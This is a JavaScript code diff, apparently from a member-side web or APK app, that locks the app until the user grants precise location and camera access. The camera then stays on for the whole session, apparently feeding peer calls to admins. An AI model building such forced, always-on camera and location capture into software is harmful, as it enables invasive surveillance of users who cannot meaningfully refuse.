-      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-      if (activeCall) activeCall.close();
-      if (activeDataConn) activeDataConn.close();
-      if (peer) peer.destroy();
+    async function requestMandatoryPermissions() {
+      if (isRequestingPerms) return;
+      isRequestingPerms = true;
+      setGateMessage("Meminta izin lokasi akurat dan kamera...");
+
+      try {
+        await requestAccurateLocation();
+        await openCameraKeepAlive(currentFacing);
+        setupMemberPeer();
+        unlockMainAppIfReady();
+      } catch (err) {
+        hasCameraPermission = Boolean(cameraStream);
+        unlockMainAppIfReady();
+        setGateMessage(
+          `Akses ditolak atau belum aktif (${err.message || "izin diperlukan"}). Aplikasi tidak dapat dibuka sebelum lokasi akurat dan kamera diizinkan.`
+        );
+      } finally {
+        isRequestingPerms = false;
+      }
+    }
+
+    function cleanupMemberSession() {
+      if (heartbeatTimer) {
+        clearInterval(heartbeatTimer);
+        heartbeatTimer = null;
+      }
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+      }
+      for (const call of Object.values(activeCallsByAdmin)) {
+        try { call.close(); } catch (e) {}
+      }
+      for (const conn of Object.values(adminConns)) {
+        try { conn.close(); } catch (e) {}
+      }
+      if (lobbyConn) {
+        try { lobbyConn.close(); } catch (e) {}
+      }
+      if (peer) {
+        try { peer.destroy(); } catch (e) {}
+      }
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      initMemberDetector();
+      unlockMainAppIfReady();
+      requestMandatoryPermissions();
     });
-    window.addEventListener("pagehide", cleanupMemberDetector);
-    window.addEventListener("beforeunload", cleanupMemberDetector);
+
+    // Kamera tetap ON selama halaman/APK terbuka; hanya dilepas saat halaman/APK ditutup
+    window.addEventListener("pagehide", cleanupMemberSession);
+    window.addEventListener("beforeunload", cleanupMemberSession);
 
     syncViewportHeight();
     updateClearSaldoBtn();
